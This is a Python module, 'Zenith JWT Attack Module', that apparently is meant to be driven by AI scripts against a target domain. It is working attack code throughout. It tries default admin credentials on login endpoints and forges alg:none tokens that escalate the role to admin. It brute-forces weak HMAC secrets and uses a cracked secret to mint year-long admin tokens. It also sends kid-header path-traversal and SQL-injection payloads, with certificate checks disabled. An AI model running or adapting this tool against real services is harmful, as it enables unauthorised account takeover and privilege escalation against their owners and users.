"""
Zenith JWT Attack Module - JSON Web Token Security Testing
Every modern app uses JWT. Weak implementations = full account takeover.

Tests for:
1. Algorithm None attack (alg: none bypass)
2. Algorithm confusion (RS256 → HS256 key confusion)
3. Weak secret brute-force (common passwords as HMAC keys)
4. Token manipulation (role escalation, expiry bypass)
5. Missing signature verification
6. JWK/JWKS injection
7. Kid header injection

Usage from AI scripts:
    from zenith.modules.jwt_attacks import JWTAttacker
    attacker = JWTAttacker("target.com")
    results = attacker.scan()
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import re
import base64
import hashlib
import hmac
import time
import struct


class JWTAttacker:
    """Automated JWT vulnerability scanner and attacker."""

    # Common weak secrets used as HMAC signing keys
    WEAK_SECRETS = [
        'secret', 'password', '123456', 'admin', 'key', 'test',
        'jwt_secret', 'jwt-secret', 'secret_key', 'secret-key',
        'mysecret', 'changeme', 'default', 'development', 'staging',
        'production', 'supersecret', 'sup3rs3cr3t', 's3cr3t',
        'jwt', 'token', 'auth', 'hmac', 'signing_key', 'signing-key',
        'private', 'private_key', 'app_secret', 'app-secret',
        'HS256', 'HS384', 'HS512', 'Signer', 'qwerty', 'letmein',
        'abc123', 'passw0rd', 'p@ssword', 'welcome', 'iloveyou',
        'monkey', 'dragon', 'master', 'login', 'princess', 'access',
        'flower', 'shadow', 'sunshine', 'trustno1', '12345678',
        '1234567890', 'whatever', '!@#$%^&*', 'hello', 'charlie',
        'donald', 'football', 'shadow', 'michael', 'ashley',
        'your-256-bit-secret', 'your-384-bit-secret',
        'your-512-bit-secret', 'AllYourBase', 'AllYourBaseAreBelongToUs',
        '', ' ',  # Empty / space secret
    ]

    # JWT header parameters to test
    ALGORITHM_ATTACKS = [
        {"alg": "none"},
        {"alg": "None"},
        {"alg": "NONE"},
        {"alg": "nOnE"},
        {"alg": "HS256"},  # For RS256→HS256 confusion
        {"alg": "HS384"},
        {"alg": "HS512"},
    ]

    def __init__(self, target, base_url=None, cookies=None, headers=None, timeout=10):
        self.target = target
        self.base_url = base_url or f"https://{target}"
        self.timeout = timeout
        self.ctx = ssl._create_unverified_context()
        self.findings = []
        self.tested = 0
        self.cookies = cookies or ""
        self.custom_headers = headers or {}
        self.discovered_tokens = []

    @staticmethod
    def _b64url_encode(data):
        """Base64url encode without padding."""
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    @staticmethod
    def _b64url_decode(data):
        """Base64url decode with padding fix."""
        if isinstance(data, str):
            data = data.encode()
        padding = 4 - len(data) % 4
        if padding != 4:
            data += b'=' * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def _decode_jwt(token):
        """Decode a JWT token without verification."""
        try:
            parts = token.split('.')
            if len(parts) < 2:
                return None, None, None

            header = json.loads(JWTAttacker._b64url_decode(parts[0]))
            payload = json.loads(JWTAttacker._b64url_decode(parts[1]))
            signature = parts[2] if len(parts) > 2 else ""
            return header, payload, signature
        except Exception:
            return None, None, None

    @staticmethod
    def _sign_hs256(header, payload, secret):
        """Sign JWT with HMAC-SHA256."""
        header_b64 = JWTAttacker._b64url_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = JWTAttacker._b64url_encode(json.dumps(payload, separators=(',', ':')))
        message = f"{header_b64}.{payload_b64}".encode()
        if isinstance(secret, str):
            secret = secret.encode()
        signature = hmac.new(secret, message, hashlib.sha256).digest()
        sig_b64 = JWTAttacker._b64url_encode(signature)
        return f"{header_b64}.{payload_b64}.{sig_b64}"

    @staticmethod
    def _sign_hs384(header, payload, secret):
        """Sign JWT with HMAC-SHA384."""
        header_b64 = JWTAttacker._b64url_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = JWTAttacker._b64url_encode(json.dumps(payload, separators=(',', ':')))
        message = f"{header_b64}.{payload_b64}".encode()
        if isinstance(secret, str):
            secret = secret.encode()
        signature = hmac.new(secret, message, hashlib.sha384).digest()
        sig_b64 = JWTAttacker._b64url_encode(signature)
        return f"{header_b64}.{payload_b64}.{sig_b64}"

    @staticmethod
    def _sign_hs512(header, payload, secret):
        """Sign JWT with HMAC-SHA512."""
        header_b64 = JWTAttacker._b64url_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = JWTAttacker._b64url_encode(json.dumps(payload, separators=(',', ':')))
        message = f"{header_b64}.{payload_b64}".encode()
        if isinstance(secret, str):
            secret = secret.encode()
        signature = hmac.new(secret, message, hashlib.sha512).digest()
        sig_b64 = JWTAttacker._b64url_encode(signature)
        return f"{header_b64}.{payload_b64}.{sig_b64}"

    @staticmethod
    def _create_none_token(payload):
        """Create JWT with alg:none (no signature)."""
        tokens = []
        for alg_header in [{"alg": "none"}, {"alg": "None"}, {"alg": "NONE"}, {"alg": "none", "typ": "JWT"}]:
            header_b64 = JWTAttacker._b64url_encode(json.dumps(alg_header, separators=(',', ':')))
            payload_b64 = JWTAttacker._b64url_encode(json.dumps(payload, separators=(',', ':')))
            # Try with and without trailing dot
            tokens.append(f"{header_b64}.{payload_b64}.")
            tokens.append(f"{header_b64}.{payload_b64}")
        return tokens

    def _request(self, url, method="GET", data=None, token=None, token_location="header"):
        """Make HTTP request with JWT token."""
        try:
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, */*',
            }
            hdrs.update(self.custom_headers)
            if self.cookies:
                hdrs['Cookie'] = self.cookies

            if token:
                if token_location == "header":
                    hdrs['Authorization'] = f'Bearer {token}'
                elif token_location == "cookie":
                    hdrs['Cookie'] = f'token={token}; jwt={token}; {self.cookies}'

            if data:
                data = json.dumps(data).encode() if isinstance(data, dict) else data.encode()
                hdrs['Content-Type'] = 'application/json'

            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            resp = urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout)
            body = resp.read(100000).decode(errors='ignore')
            return {
                'status': resp.status,
                'body': body,
                'headers': dict(resp.getheaders()),
                'length': len(body),
            }
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(50000).decode(errors='ignore')
            except:
                pass
            return {'status': e.code, 'body': body, 'headers': {}, 'length': len(body)}
        except Exception as e:
            return {'status': 0, 'body': str(e), 'headers': {}, 'length': 0}

    def _discover_tokens(self):
        """Find JWT tokens in responses, cookies, and common auth endpoints."""
        tokens = []
        print(f"  [*] Discovering JWT tokens...")

        # Check common auth endpoints
        auth_endpoints = [
            '/api/auth/login', '/api/login', '/auth/login', '/login',
            '/api/token', '/oauth/token', '/api/v1/auth', '/api/v1/login',
            '/api/auth', '/api/signin', '/signin', '/api/authenticate',
        ]

        # Try login with common creds
        login_payloads = [
            {"username": "admin", "password": "admin"},
            {"email": "admin@admin.com", "password": "admin"},
            {"username": "test", "password": "test"},
            {"email": "test@test.com", "password": "test123"},
            {"user": "admin", "pass": "admin"},
        ]

        for endpoint in auth_endpoints:
            for creds in login_payloads:
                resp = self._request(f"{self.base_url}{endpoint}", method="POST", data=creds)
                self.tested += 1

                # Check response body for JWT
                jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
                found = re.findall(jwt_pattern, resp['body'])
                for t in found:
                    header, payload, sig = self._decode_jwt(t)
                    if header and payload:
                        tokens.append({'token': t, 'source': f"POST {endpoint}", 'header': header, 'payload': payload})
                        print(f"  [+] Found JWT in response body: {endpoint}")

                # Check response headers
                for h_name, h_val in resp['headers'].items():
                    found = re.findall(jwt_pattern, str(h_val))
                    for t in found:
                        header, payload, sig = self._decode_jwt(t)
                        if header and payload:
                            tokens.append({'token': t, 'source': f"Header:{h_name}", 'header': header, 'payload': payload})

        # Fetch main page and check for tokens in cookies/JS
        resp = self._request(self.base_url)
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
        found = re.findall(jwt_pattern, resp['body'])
        for t in found:
            header, payload, sig = self._decode_jwt(t)
            if header and payload:
                tokens.append({'token': t, 'source': "main_page", 'header': header, 'payload': payload})

        # Check cookies
        for h_name, h_val in resp['headers'].items():
            if h_name.lower() == 'set-cookie':
                found = re.findall(jwt_pattern, h_val)
                for t in found:
                    header, payload, sig = self._decode_jwt(t)
                    if header and payload:
                        tokens.append({'token': t, 'source': "cookie", 'header': header, 'payload': payload})

        return tokens

    def _test_alg_none(self, token_info):
        """Test Algorithm None attack - remove signature."""
        print(f"  [*] Testing alg:none attack...")
        results = []
        payload = token_info['payload'].copy()

        # Try to escalate privileges if possible
        escalated_payloads = [payload]
        priv_fields = ['role', 'admin', 'is_admin', 'isAdmin', 'privileges', 'scope', 'type', 'group']
        for field in priv_fields:
            if field in payload:
                modified = payload.copy()
                if field in ('admin', 'is_admin', 'isAdmin'):
                    modified[field] = True
                elif field == 'role':
                    modified[field] = 'admin'
                elif field == 'scope':
                    modified[field] = 'admin read write'
                escalated_payloads.append(modified)

        # Remove expiry
        no_exp = payload.copy()
        no_exp.pop('exp', None)
        no_exp['exp'] = int(time.time()) + 86400 * 365  # 1 year from now
        escalated_payloads.append(no_exp)

        for test_payload in escalated_payloads:
            none_tokens = self._create_none_token(test_payload)
            for none_token in none_tokens:
                # Try with Authorization header
                resp = self._request(f"{self.base_url}/api/me", token=none_token)
                self.tested += 1

                if resp['status'] == 200 and resp['length'] > 20:
                    results.append({
                        'type': 'JWT_ALG_NONE',
                        'severity': 'CRITICAL',
                        'detail': f"Algorithm None bypass accepted! Response: {resp['body'][:100]}",
                        'token': none_token[:80] + '...',
                        'payload': test_payload,
                        'response_status': resp['status'],
                    })
                    print(f"  🔴 CRITICAL: alg:none token ACCEPTED!")

                # Also try as cookie
                resp = self._request(f"{self.base_url}/api/me", token=none_token, token_location="cookie")
                self.tested += 1
                if resp['status'] == 200 and resp['length'] > 20:
                    results.append({
                        'type': 'JWT_ALG_NONE_COOKIE',
                        'severity': 'CRITICAL',
                        'detail': f"alg:none via cookie accepted! {resp['body'][:100]}",
                        'token': none_token[:80] + '...',
                    })

        return results

    def _test_weak_secret(self, token_info):
        """Brute-force weak HMAC secrets."""
        print(f"  [*] Testing weak secrets ({len(self.WEAK_SECRETS)} candidates)...")
        results = []
        original_token = token_info['token']
        header = token_info['header']
        payload = token_info['payload']

        # Only test if algorithm is HMAC-based
        alg = header.get('alg', 'HS256')
        if alg not in ('HS256', 'HS384', 'HS512'):
            # Try HS256 anyway (algorithm confusion)
            alg = 'HS256'

        sign_func = {
            'HS256': self._sign_hs256,
            'HS384': self._sign_hs384,
            'HS512': self._sign_hs512,
        }.get(alg, self._sign_hs256)

        for secret in self.WEAK_SECRETS:
            test_token = sign_func({"alg": alg, "typ": "JWT"}, payload, secret)
            self.tested += 1

            # Compare signatures
            original_sig = original_token.split('.')[-1] if '.' in original_token else ''
            test_sig = test_token.split('.')[-1]

            if original_sig and test_sig == original_sig:
                results.append({
                    'type': 'JWT_WEAK_SECRET',
                    'severity': 'CRITICAL',
                    'detail': f"JWT secret cracked! Secret: '{secret}'",
                    'secret': secret,
                    'algorithm': alg,
                })
                print(f"  🔴 CRITICAL: JWT secret cracked: '{secret}'")

                # Now forge an admin token
                admin_payload = payload.copy()
                admin_payload.pop('exp', None)
                admin_payload['exp'] = int(time.time()) + 86400 * 365
                for field in ['role', 'admin', 'is_admin', 'isAdmin']:
                    if field in admin_payload:
                        admin_payload[field] = 'admin' if field == 'role' else True
                admin_payload['role'] = 'admin'
                admin_payload['is_admin'] = True

                forged = sign_func({"alg": alg, "typ": "JWT"}, admin_payload, secret)
                results.append({
                    'type': 'JWT_FORGED_ADMIN',
                    'severity': 'CRITICAL',
                    'detail': f"Forged admin token with cracked secret",
                    'forged_token': forged[:100] + '...',
                    'admin_payload': admin_payload,
                })
                break  # Found the secret, no need to continue

        return results

    def _test_expiry_bypass(self, token_info):
        """Test if expired tokens are still accepted."""
        print(f"  [*] Testing token expiry validation...")
        results = []
        payload = token_info['payload']

        if 'exp' in payload:
            exp_time = payload['exp']
            now = int(time.time())
            if exp_time < now:
                # Token is already expired, test if it's still accepted
                resp = self._request(f"{self.base_url}/api/me", token=token_info['token'])
                self.tested += 1
                if resp['status'] == 200:
                    results.append({
                        'type': 'JWT_EXPIRED_ACCEPTED',
                        'severity': 'HIGH',
                        'detail': f"Expired JWT token still accepted! Expired {now - exp_time}s ago",
                        'expired_seconds': now - exp_time,
                    })
                    print(f"  🟠 HIGH: Expired token accepted!")

        return results

    def _test_kid_injection(self, token_info):
        """Test Key ID (kid) header injection."""
        print(f"  [*] Testing kid header injection...")
        results = []
        payload = token_info['payload']

        # kid injection payloads
        kid_payloads = [
            ("../../dev/null", ""),  # Sign with empty key
            ("/dev/null", ""),
            ("../../../etc/hostname", ""),  # Read hostname
            ("' UNION SELECT 'secret' --", "secret"),  # SQL injection in kid
            ("../../proc/self/environ", ""),
        ]

        for kid_value, secret in kid_payloads:
            header = {"alg": "HS256", "typ": "JWT", "kid": kid_value}
            forged = self._sign_hs256(header, payload, secret)

            resp = self._request(f"{self.base_url}/api/me", token=forged)
            self.tested += 1

            if resp['status'] == 200 and resp['length'] > 20:
                results.append({
                    'type': 'JWT_KID_INJECTION',
                    'severity': 'CRITICAL',
                    'detail': f"kid injection worked with: {kid_value}",
                    'kid_payload': kid_value,
                    'response': resp['body'][:100],
                })
                print(f"  🔴 CRITICAL: kid injection accepted!")

        return results

    def _test_jwks_endpoint(self):
        """Check for exposed JWKS endpoints."""
        print(f"  [*] Checking JWKS endpoints...")
        results = []
        jwks_paths = [
            '/.well-known/jwks.json', '/jwks.json', '/api/jwks',
            '/.well-known/openid-configuration', '/oauth/jwks',
            '/auth/jwks', '/.well-known/keys', '/api/keys',
        ]

        for path in jwks_paths:
            resp = self._request(f"{self.base_url}{path}")
            self.tested += 1
            if resp['status'] == 200:
                try:
                    data = json.loads(resp['body'])
                    if 'keys' in data or 'jwks_uri' in data or 'n' in resp['body']:
                        results.append({
                            'type': 'JWKS_EXPOSED',
                            'severity': 'MEDIUM',
                            'detail': f"JWKS endpoint exposed: {path}",
                            'endpoint': path,
                            'keys_count': len(data.get('keys', [])),
                        })
                        print(f"  🟡 JWKS exposed: {path}")
                except json.JSONDecodeError:
                    pass

        return results

    def _analyze_token(self, token_info):
        """Analyze JWT token for security issues."""
        print(f"  [*] Analyzing token structure...")
        issues = []
        header = token_info['header']
        payload = token_info['payload']

        # Check algorithm
        alg = header.get('alg', 'unknown')
        if alg in ('HS256',):
            issues.append({
                'type': 'JWT_WEAK_ALG',
                'severity': 'LOW',
                'detail': f"Using {alg} - consider RS256 for better security",
            })

        # Check for sensitive data in payload
        sensitive_fields = ['password', 'passwd', 'pwd', 'secret', 'credit_card', 'ssn', 'api_key']
        for field in sensitive_fields:
            if field in payload:
                issues.append({
                    'type': 'JWT_SENSITIVE_DATA',
                    'severity': 'HIGH',
                    'detail': f"Sensitive field '{field}' found in JWT payload!",
                    'field': field,
                })

        # Check expiry
        if 'exp' not in payload:
            issues.append({
                'type': 'JWT_NO_EXPIRY',
                'severity': 'MEDIUM',
                'detail': "JWT has no expiration (exp) claim - tokens never expire!",
            })
        else:
            exp = payload['exp']
            now = int(time.time())
            if exp - now > 86400 * 30:  # More than 30 days
                issues.append({
                    'type': 'JWT_LONG_EXPIRY',
                    'severity': 'LOW',
                    'detail': f"JWT expires in {(exp - now) // 86400} days - very long lifetime",
                })

        # Check for missing claims
        if 'iss' not in payload:
            issues.append({
                'type': 'JWT_NO_ISSUER',
                'severity': 'LOW',
                'detail': "No issuer (iss) claim - harder to validate token origin",
            })

        return issues

    def scan(self):
        """Run the full JWT attack scan."""
        print(f"\n{'='*60}")
        print(f"  JWT Attack Scanner - {self.target}")
        print(f"{'='*60}")

        all_findings = []

        # Phase 1: Discover JWT tokens
        print(f"\n[Phase 1] JWT Token Discovery")
        self.discovered_tokens = self._discover_tokens()
        print(f"  [*] Found {len(self.discovered_tokens)} JWT tokens")

        if not self.discovered_tokens:
            print(f"  [!] No JWT tokens found. Checking JWKS endpoints only...")
            jwks_findings = self._test_jwks_endpoint()
            all_findings.extend(jwks_findings)
        else:
            # Analyze and display discovered tokens
            for i, token_info in enumerate(self.discovered_tokens):
                print(f"\n  Token #{i+1}:")
                print(f"    Source: {token_info['source']}")
                print(f"    Algorithm: {token_info['header'].get('alg', 'unknown')}")
                print(f"    Payload keys: {list(token_info['payload'].keys())}")
                if 'sub' in token_info['payload']:
                    print(f"    Subject: {token_info['payload']['sub']}")
                if 'role' in token_info['payload']:
                    print(f"    Role: {token_info['payload']['role']}")

            # Phase 2: Attack each token
            for i, token_info in enumerate(self.discovered_tokens):
                print(f"\n[Phase 2.{i+1}] Attacking Token #{i+1}")

                # Analyze token structure
                analysis = self._analyze_token(token_info)
                all_findings.extend(analysis)

                # Test alg:none
                none_results = self._test_alg_none(token_info)
                all_findings.extend(none_results)

                # Test weak secrets
                weak_results = self._test_weak_secret(token_info)
                all_findings.extend(weak_results)

                # Test expired token acceptance
                expiry_results = self._test_expiry_bypass(token_info)
                all_findings.extend(expiry_results)

                # Test kid injection
                kid_results = self._test_kid_injection(token_info)
                all_findings.extend(kid_results)

            # Phase 3: JWKS endpoint
            print(f"\n[Phase 3] JWKS Endpoint Discovery")
            jwks_findings = self._test_jwks_endpoint()
            all_findings.extend(jwks_findings)

        self.findings = all_findings

        # Report
        print(f"\n{'='*60}")
        print(f"  JWT ATTACK RESULTS")
        print(f"{'='*60}")
        print(f"  Tokens found: {len(self.discovered_tokens)}")
        print(f"  Requests made: {self.tested}")
        print(f"  Findings: {len(all_findings)}")

        critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
        high = [f for f in all_findings if f.get('severity') == 'HIGH']

        if all_findings:
            for i, f in enumerate(all_findings, 1):
                sev = f.get('severity', 'INFO')
                sev_icon = '🔴' if sev == 'CRITICAL' else '🟠' if sev == 'HIGH' else '🟡'
                print(f"\n  {sev_icon} [{sev}] Finding #{i}: {f['type']}")
                print(f"     Detail: {f.get('detail', 'N/A')}")
                if f.get('secret'):
                    print(f"     Secret: {f['secret']}")
                if f.get('forged_token'):
                    print(f"     Forged: {f['forged_token']}")
        else:
            print(f"\n  ✓ No JWT vulnerabilities detected.")

        if critical:
            print(f"\n  ⚡ {len(critical)} CRITICAL findings - account takeover possible!")

        return all_findings


# CLI entry point
if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_DOMAIN"
    cookies = sys.argv[2] if len(sys.argv) > 2 else ""
    attacker = JWTAttacker(target, cookies=cookies)
    results = attacker.scan()
    if results:
        print(f"\n⚠ TOTAL JWT FINDINGS: {len(results)}")
        for r in results:
            print(json.dumps(r, indent=2, default=str))
